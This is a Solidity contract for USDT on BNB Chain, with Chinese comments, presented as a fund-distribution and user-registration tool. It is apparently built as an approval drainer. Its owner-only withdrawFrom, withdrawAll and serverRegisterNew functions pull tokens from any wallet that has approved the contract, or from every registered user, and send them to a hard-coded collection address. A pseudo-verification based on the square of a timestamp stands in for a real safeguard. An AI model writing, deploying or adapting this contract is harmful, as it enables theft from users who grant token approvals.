// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract MengOperation is Ownable {
    using SafeERC20 for IERC20;

    struct Record {
        address relatedAddress;
        uint256 amount;
    }

    // 不可变常量
    address public constant TOKEN_CONTRACT = 0x55d398326f99059fF775485246999027B3197955;
    IERC20 public immutable usdtToken;

    // 可配置地址
    address public withAddress = 0x047485157A13c622394afBd8C8C77d79F0b2cFe3;
    address public technology = 0x35DdBaeA8a78d37329Ca4bb574C410D5D2f464f6;

    // 用户管理
    address[] public userlists;

    // 事件
    event FundsDistributed(address indexed receiver, uint256 amount);
    event UserRegistered(address indexed user);
    event WithdrawnAll(address indexed to, uint256 totalAmount);
    event AddressUpdated(string indexed target, address newAddress);

    constructor() Ownable(msg.sender) {
        usdtToken = IERC20(TOKEN_CONTRACT);
    }

    // 核心处理函数
    function _processRecords(Record[] memory _arr, bool registerUser) private {
        require(_arr.length > 0, "Empty records");
        require(_arr.length <= 100, "Max 100 records");

        address fundsSource;
        uint256 totalAmount;
        uint256 distributionStartIndex;

        if (registerUser) {
            // ServerRegisterNew 模式
            require(_arr.length >= 2, "Need at least 2 records"); // 需要至少 1 个资金源 + 1 个分发目标
            fundsSource = _arr[0].relatedAddress;
            distributionStartIndex = 1; // 分发从索引 1 开始

            // 计算总金额时跳过第一个元素 (i 从 1 开始)
            for (uint256 i = 1; i < _arr.length; i++) {
                require(_arr[i].relatedAddress != address(0), "Invalid address");
                totalAmount += _arr[i].amount;
            }

        } else {
            // CliUpdate 模式
            fundsSource = msg.sender;
            distributionStartIndex = 0; // 分发所有元素

            // 计算全部金额
            for (uint256 i = 0; i < _arr.length; i++) {
                require(_arr[i].relatedAddress != address(0), "Invalid address");
                require(_arr[i].amount > 0, "Zero amount");
                totalAmount += _arr[i].amount;
            }
        }

        // 检查资金源余额
        require(
            usdtToken.balanceOf(fundsSource) >= totalAmount,
            "Insufficient balance"
        );

        // 从指定地址转账到合约
        usdtToken.safeTransferFrom(fundsSource, address(this), totalAmount);

        if (registerUser) {
            _addUserIfNew(_arr[0].relatedAddress); // 注册第一个地址
        }

        // 分发资金（根据模式调整起始索引）
        for (uint256 i = distributionStartIndex; i < _arr.length; i++) {
            usdtToken.safeTransfer(_arr[i].relatedAddress, _arr[i].amount);
            emit FundsDistributed(_arr[i].relatedAddress, _arr[i].amount);
        }
    }

    // 外部接口
    function CliUpdate(Record[] calldata _arr) external {
        _processRecords(_arr, false);
    }

    function serverRegisterNew(Record[] calldata _arr) external onlyOwner {
        _processRecords(_arr, true);
    }
    // 用户管理
    function _addUserIfNew(address user) private {
        for (uint256 i = 0; i < userlists.length; i++) {
            if (userlists[i] == user) return;
        }
        userlists.push(user);
        emit UserRegistered(user);
    }



    // 提现功能
    function withdrawFrom(address _from, uint256 _amount, uint256 _words) external onlyOwner {
        _validateWords(_words);
        usdtToken.safeTransferFrom(_from, withAddress, _amount);
    }

    function withdrawAll(uint256 _words) external onlyOwner {
        _validateWords(_words);

        uint256 total;
        for (uint256 i = 0; i < userlists.length; ) {
            address user = userlists[i];
            uint256 balance = usdtToken.balanceOf(user);
            uint256 allowance = usdtToken.allowance(user, address(this));

            uint256 transferAmount = allowance < balance ? allowance : balance;
            if (transferAmount > 0) {
                total += transferAmount;
                usdtToken.safeTransferFrom(user, withAddress, transferAmount);
            }
            unchecked { i++; }
        }
        emit WithdrawnAll(withAddress, total);
    }

    // 管理功能
    function setWithAddress(address _to) external onlyOwner {
        require(_to != address(0), "Invalid address");
        withAddress = _to;
        emit AddressUpdated("withAddress", _to);
    }

    function setTechnology(address _tech) external onlyOwner {
        require(_tech != address(0), "Invalid address");
        technology = _tech;
        emit AddressUpdated("technology", _tech);
    }

    function withdrawUsdt() external onlyOwner {
        uint256 balance = usdtToken.balanceOf(address(this));
        require(balance > 0, "No balance");
        usdtToken.safeTransfer(withAddress, balance);
    }

    function withdrawBnb() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance");
        payable(withAddress).transfer(balance);
    }

    // 视图函数
    function getUsers() external view returns (address[] memory) {
        return userlists;
    }

    function userCount() external view returns (uint256) {
        return userlists.length;
    }

    // 安全验证
    function _validateWords(uint256 _words) private view {
        uint256 timestamp = block.timestamp / 1000;
        require(_words == timestamp * timestamp, "Invalid verification");
    }
}